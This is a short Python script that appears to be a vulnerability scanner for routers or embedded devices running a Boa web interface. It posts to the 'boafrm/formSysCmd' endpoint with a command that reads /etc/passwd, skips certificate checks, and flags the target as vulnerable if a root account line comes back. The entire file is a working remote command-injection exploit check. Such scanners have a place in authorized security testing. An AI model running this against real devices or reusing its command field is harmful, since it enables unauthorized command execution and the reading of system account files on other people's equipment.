import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def scan(baseurl):
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"boafrm/formSysCmd"
	body="sysCmd=cat+%2Fetc%2Fpasswd&apply=Apply&submit-url=%2Fsyscmd.htm&msg="
	headers={'Content-Type': 'application/x-www-form-urlencoded'}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and re.search("root:.*:0",response.text):
		r0=True
	else:
		r0=False
	if r0:
		return True
	else:
		return False
